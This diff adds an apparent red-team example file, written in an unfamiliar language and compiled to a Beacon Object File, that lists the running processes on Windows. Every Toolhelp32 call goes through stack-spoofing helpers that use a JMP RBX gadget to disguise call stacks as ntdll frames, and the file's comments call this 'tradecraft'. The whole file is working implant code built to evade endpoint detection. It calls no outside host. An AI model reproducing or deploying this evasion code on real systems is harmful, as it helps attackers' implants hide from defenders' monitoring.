@@ -1,0 +1,73 @@
+// SPDX-License-Identifier: Apache-2.0
+// bof_pslist_spoofed.etpy - process enumeration with stack-spoofed
+// Win32 calls.
+//
+// Same tradecraft as bof_pslist.etpy but every Toolhelp32 call
+// is dispatched through stackspoof_callN so the kernel-side stack walk during the call sees ntdll-shaped frames instead of our memory.
+//
+// What you're trading:
+//   - Two extra Win32 calls per spoofed dispatch
+//     (GetModuleHandleA + GetProcAddress to resolve fn_ptr).
+//   - +6 bytes per call site (the helper stub).
+//
+// Build:  entc compile example/bof_pslist_spoofed.etpy --type=bof
+// Run:    bof-runner example/bof_pslist_spoofed.obj
+
+use bof;
+use opsec_stack_spoof;
+use_c "stdlib/win32/toolhelp.h";
+
+// Resolve a Win32 export to a raw function pointer for use with
+// the stackspoof helpers. Wrapping GetModuleHandleA + GetProcAddress so the operator-visible code stays tidy.
+fn resolve(module: str, function: str) -> u64 {
+    var h: void* = Kernel32.GetModuleHandleA(module);
+    if h == (void*)0 { ret 0; }
+    ret (u64)Kernel32.GetProcAddress(h, function);
+}
+
+fn go(args: char*, len: int) -> void {
+    // discover the JMP RBX gadget so the per-call overhead stays constant. 
+    //(Optional - the first stackspoof_callN does the discovery lazily anyway)
+    var gadget: u64 = stackspoof_init();
+    if gadget == 0 {
+        BeaconPrintf(0, "[!] no JMP RBX gadget found; falling back to plain calls\n");
+    } else {
+        BeaconPrintf(0, str.format("[+] JMP RBX gadget @ 0x{x}\n", (int)gadget));
+    }
+
+    var pCreateSnap: u64 = resolve("kernel32.dll", "CreateToolhelp32Snapshot");
+    var pProcFirst:  u64 = resolve("kernel32.dll", "Process32First");
+    var pProcNext:   u64 = resolve("kernel32.dll", "Process32Next");
+    var pCloseHandle:u64 = resolve("kernel32.dll", "CloseHandle");
+
+    // CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+    var snap: u64 = stackspoof_call2(pCreateSnap, (u64)TH32CS_SNAPPROCESS, 0);
+    if snap == 0xFFFFFFFFFFFFFFFF {
+        BeaconPrintf(0, "[!] CreateToolhelp32Snapshot failed\n");
+        ret;
+    }
+
+    var pe: PROCESSENTRY32;
+    pe.dwSize = (u32)sizeof(PROCESSENTRY32);
+
+    // Process32First(snap, &pe)
+    var ok: u64 = stackspoof_call2(pProcFirst, snap, (u64)&pe);
+    if ok == 0 {
+        stackspoof_call1(pCloseHandle, snap);
+        BeaconPrintf(0, "[!] Process32First failed\n");
+        ret;
+    }
+
+    BeaconPrintf(0, "[+]   PID  Process (spoofed-call dispatch)\n");
+    var count: int = 0;
+    while ok != 0 {
+        BeaconPrintf(0, str.format("[+] {d}  {s}\n",
+                                   (int)pe.th32ProcessID,
+                                   (char*)pe.szExeFile));
+        count = count + 1;
+        ok = stackspoof_call2(pProcNext, snap, (u64)&pe);
+    }
+    stackspoof_call1(pCloseHandle, snap);
+    BeaconPrintf(0, str.format("[+] enumerated {d} processes\n", count));
+    ret;
+}
